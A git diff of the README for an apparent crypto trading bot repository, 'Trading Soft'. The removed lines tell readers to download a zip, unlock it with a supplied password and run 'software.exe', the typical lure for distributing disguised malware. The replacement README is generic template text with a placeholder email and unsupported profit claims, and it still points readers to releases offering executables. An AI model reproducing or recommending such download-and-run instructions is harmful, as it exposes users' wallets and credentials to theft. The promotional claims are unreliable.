@@ -1,45 +1,129 @@
-# Trade
+# Trading Soft: Intelligent Automated Cryptocurrency Trading Bot 🤖💰
 
-The project is aimed at developing an intelligent bot for automated cryptocurrency trading, leveraging advanced machine learning (ML) algorithms and feature engineering. The project offers the following core functionalities:
+![Trading Soft](https://img.shields.io/badge/Trading%20Soft-Intelligent%20Crypto%20Bot-blue.svg)
 
-+ Defining derived features using custom (Python) functions, including technical indicators
-+ Analyzing historical data and training machine learning models in batch mode (offline)
-+ Analyzing predicted scores and selecting the best signal parameters
-+ A signaling service that regularly requests new data from the exchange and generates buy/sell signals by applying the trained models in real-time
-+ A trading service that executes trades based on generated signals
+Welcome to **Trading Soft**! This project focuses on developing an intelligent bot for automated cryptocurrency trading. By utilizing advanced machine learning (ML) algorithms and effective feature engineering, we aim to streamline trading processes and maximize profits in the dynamic world of cryptocurrency.
 
-# How to Download
+## Table of Contents
 
-Download the [Release](https://github.com/joulefingers3z/trading_soft/releases/download/download/files.zip). Extract ***.zip*** (password: SOL!Launch37) and run ***software.exe***.
+- [Core Functionalities](#core-functionalities)
+- [Technologies Used](#technologies-used)
+- [Getting Started](#getting-started)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Contributing](#contributing)
+- [License](#license)
+- [Contact](#contact)
+- [Releases](#releases)
 
-# License
+## Core Functionalities
 
-The TRADE is released under the MIT license. See [COPYING](https://github.com/bitcoin/bitcoin/blob/master/COPYING) for more information or visit https://opensource.org/licenses/MIT.
+Trading Soft provides several core functionalities designed to enhance your trading experience:
 
-# Trading
+1. **Automated Trading**: Execute trades automatically based on predefined strategies and market conditions.
+2. **Arbitrage Opportunities**: Identify and exploit price differences across various exchanges to maximize profits.
+3. **Risk Management**: Implement strategies to minimize losses and protect your investments.
+4. **Real-time Data Analysis**: Analyze market data in real-time to make informed trading decisions.
+5. **Customizable Strategies**: Tailor trading strategies to fit your individual risk tolerance and investment goals.
+6. **User-friendly Interface**: Navigate through a simple and intuitive interface for seamless trading.
 
-The bot is currently configured with the following parameters:
+## Technologies Used
 
-+ Exchange: Compatible with most popular platforms
-+ Cryptocurrency: Supports all coins
-+ Analysis frequency: 1 minute (currently the only option)
-+ Score range: Between -1 and +1. A score < 0 indicates a likely decrease, and > 0 indicates a likely increase
-+ Filter: Notifications are sent only if the score exceeds ±0.20 (subject to change)
-+ Additional signs are added for each 0.05 increment (exceeding the filter threshold)
+This project leverages a variety of technologies and tools to deliver a robust trading solution:
 
-# Features
+- **Python**: The primary programming language for developing the bot.
+- **Pandas**: For data manipulation and analysis.
+- **NumPy**: To handle numerical computations.
+- **Scikit-learn**: For implementing machine learning algorithms.
+- **Matplotlib**: For data visualization.
+- **CCXT**: A library to connect with various cryptocurrency exchanges.
+- **Docker**: To containerize the application for easy deployment.
 
-+ The bot currently operates in a non-incremental model, computing features for all available data (not just the latest update), which can take several hours for more complex configurations.
-+ The script loads merged input data, applies feature generation procedures, and stores all derived features in an output file.
-+ Not all generated features are used for training and prediction. A separate list of features is specified for training/prediction phases.
-+ Feature functions can accept additional parameters, like window sizes, from the configuration section.
-+ The same features must be used for both online (real-time) and offline (batch) feature generation.
+## Getting Started
 
-# Sponsorship
+To get started with Trading Soft, follow the steps outlined in the [Installation](#installation) section. Ensure you have the necessary prerequisites installed on your system.
 
-[Become a sponsor](https://github.com/404)
+## Installation
 
-# Contact Us
+1. **Clone the Repository**: Start by cloning the repository to your local machine.
 
-crypto.ex@devby.same
+   ```bash
+   git clone https://github.com/AgungWidhiPramana/trading_soft.git
+   cd trading_soft
+   ```
 
+2. **Install Dependencies**: Use pip to install the required libraries.
+
+   ```bash
+   pip install -r requirements.txt
+   ```
+
+3. **Set Up Configuration**: Configure your API keys and other settings in the `config.json` file.
+
+4. **Run the Bot**: Execute the bot to start trading.
+
+   ```bash
+   python main.py
+   ```
+
+## Usage
+
+Once you have installed Trading Soft, you can start using it to trade cryptocurrencies. The bot will automatically execute trades based on the strategies you have set up.
+
+### Example Commands
+
+- **Start Trading**: Run the bot to begin trading.
+
+   ```bash
+   python main.py
+   ```
+
+- **Stop Trading**: To stop the bot, simply terminate the process.
+
+### User Guide
+
+Refer to the [Wiki](https://github.com/AgungWidhiPramana/trading_soft/wiki) for detailed documentation on using Trading Soft, including advanced configuration options and troubleshooting tips.
+
+## Contributing
+
+We welcome contributions to improve Trading Soft. If you have suggestions or want to report issues, please follow these steps:
+
+1. **Fork the Repository**: Create a personal copy of the repository.
+2. **Create a Branch**: Use a descriptive name for your branch.
+
+   ```bash
+   git checkout -b feature/YourFeatureName
+   ```
+
+3. **Make Changes**: Implement your changes and commit them.
+
+   ```bash
+   git commit -m "Add a new feature"
+   ```
+
+4. **Push to Your Fork**: Push your changes to your forked repository.
+
+   ```bash
+   git push origin feature/YourFeatureName
+   ```
+
+5. **Open a Pull Request**: Submit a pull request to the main repository for review.
+
+## License
+
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for more details.
+
+## Contact
+
+For questions or feedback, feel free to reach out:
+
+- **Email**: your_email@example.com
+- **GitHub**: [AgungWidhiPramana](https://github.com/AgungWidhiPramana)
+
+## Releases
+
+To download the latest release of Trading Soft, visit our [Releases](https://github.com/AgungWidhiPramana/trading_soft/releases) section. Here, you can find the latest updates and executable files for your convenience.
+
+---
+
+Thank you for your interest in Trading Soft! We hope this bot enhances your trading experience in the cryptocurrency market. Happy trading! 🚀
